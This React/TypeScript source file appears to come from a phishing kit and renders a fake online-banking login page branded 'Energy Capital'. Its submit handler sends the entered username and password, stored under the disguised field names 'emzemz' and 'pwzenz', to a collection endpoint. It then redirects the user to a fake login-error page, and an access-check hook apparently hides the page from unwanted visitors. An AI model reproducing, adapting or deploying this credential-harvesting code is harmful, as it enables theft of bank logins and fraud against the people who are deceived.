import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import Footer from '../components/Footer';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const [activeTab, setActiveTab] = useState<'password' | 'biometric'>('password');
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // If access is explicitly denied (not just loading), show loading
  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };



  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    if (activeTab !== 'password') {
      setIsLoading(false);
      return;
    }

    let newErrors = { emzemz: '', pwzenz: '' };

    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password is required.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    if (!newErrors.emzemz && !newErrors.pwzenz) {
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/logix-meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/login-error');
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div
      className="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat flex flex-col relative overflow-hidden text-white"
      style={{ backgroundImage: "url('/assets/dark-login.jpeg')" }}
    >
      <div className="absolute inset-0 bg-black/40 pointer-events-none"></div>
      <div className="relative z-10 flex flex-col flex-1">
        <div className="flex-grow flex flex-col items-center justify-center px-4 pb-12">
          <header className="text-center z-10">
            <img
              src="/assets/blue.png"
              alt="Energy Capital logo"
              className="mx-auto h-16 w-auto"
            />
          </header>

          <div className="mt-6 w-[90%] max-w-3xl z-10">
            <img
              src="/assets/selbnr.png"
              alt="Protect your privacy"
              className="w-full rounded-md"
            />
          </div>

          <div className="mt-10 bg-[#1b1f2f] rounded-xl shadow-lg p-8 w-[90%] max-w-sm z-10">
            <div className="flex mb-6 rounded-md overflow-hidden border border-gray-600 bg-[#1b1f2f]">
              <button
                type="button"
                className={`flex-1 py-2 font-semibold transition-colors ${
                  activeTab === 'password'
                    ? 'bg-[#283045] text-white'
                    : 'bg-[#1b1f2f] text-gray-400 hover:text-gray-200'
                }`}
                onClick={() => setActiveTab('password')}
              >
                Password
              </button>
              <button
                type="button"
                className={`flex-1 py-2 font-semibold transition-colors ${
                  activeTab === 'biometric'
                    ? 'bg-[#283045] text-white'
                    : 'bg-[#1b1f2f] text-gray-400 hover:text-gray-200'
                }`}
                onClick={() => setActiveTab('biometric')}
              >
                Biometric
              </button>
            </div>

            <form onSubmit={handleSubmit}>
              <div className="mb-4">
                <label className="text-gray-400 text-sm">Username</label>
                <div
                  className={`flex items-center gap-3 border-b transition-colors ${
                    errors.emzemz ? 'border-red-500' : 'border-gray-500 focus-within:border-[#00b4ff]'
                  }`}
                >
                  <span className="text-[#00b4ff]">
                    <svg
                      className="w-5 h-5"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        d="M15.75 6.75a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.5 20.25a7.5 7.5 0 0 1 15 0"
                      />
                    </svg>
                  </span>
                  <input
                    id="emzemz"
                    name="emzemz"
                    type="text"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className="flex-1 bg-transparent text-white focus:outline-none py-2"
                    placeholder="Enter your username"
                  />
                </div>
                {errors.emzemz && (
                  <p className="text-xs text-red-400 mt-2">{errors.emzemz}</p>
                )}
              </div>

              {activeTab === 'password' && (
                <div className="mb-6">
                  <label className="text-gray-400 text-sm">Password</label>
                  <div
                    className={`flex items-center gap-3 border-b transition-colors ${
                      errors.pwzenz ? 'border-red-500' : 'border-gray-500 focus-within:border-[#00b4ff]'
                    }`}
                  >
                    <span className="text-[#00b4ff]">
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="1.5"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          d="M16.5 10.5V7.875a4.125 4.125 0 1 0-8.25 0V10.5M6.75 10.5h10.5A1.75 1.75 0 0 1 19 12.25v7a1.75 1.75 0 0 1-1.75 1.75H6.75A1.75 1.75 0 0 1 5 19.25v-7A1.75 1.75 0 0 1 6.75 10.5Z"
                        />
                      </svg>
                    </span>
                    <input
                      id="pwzenz"
                      name="pwzenz"
                      type={showPwzenz ? 'text' : 'password'}
                      value={pwzenz}
                      onChange={(e) => setPwzenz(e.target.value)}
                      className="flex-1 bg-transparent text-white focus:outline-none py-2"
                      placeholder="Enter your password"
                    />
                    <button
                      type="button"
                      onClick={togglePwzenzVisibility}
                      className="text-[#00b4ff] text-sm hover:text-white"
                    >
                      {showPwzenz ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  {errors.pwzenz && (
                    <p className="text-xs text-red-400 mt-2">{errors.pwzenz}</p>
                  )}
                </div>
              )}

              <button
                type="submit"
                disabled={isLoading}
                className={`w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md mt-6 transition-colors ${
                  isLoading ? 'opacity-60 cursor-not-allowed' : 'hover:bg-[#38bdf8]'
                }`}
              >
                {isLoading
                  ? 'Submitting...'
                  : activeTab === 'password'
                  ? 'Sign in'
                  : 'Continue'}
              </button>
            </form>

            <div className="text-sm mt-4 space-y-2 text-center">
              <a href="#" className="text-[#00b4ff] hover:underline block">
                Forgot username/password?
              </a>
              <a href="#" className="text-[#00b4ff] hover:underline block">
                Enroll in new online banking
              </a>
            </div>

            <p className="text-[11px] text-gray-400 mt-4 text-center leading-snug">
              This site is protected by reCAPTCHA and the Google{' '}
              <a href="#" className="underline">Privacy Policy</a> and{' '}
              <a href="#" className="underline">Terms of Service</a> apply.
            </p>
          </div>
        </div>

      
      </div>
    </div>
  );
};

export default LoginForm;
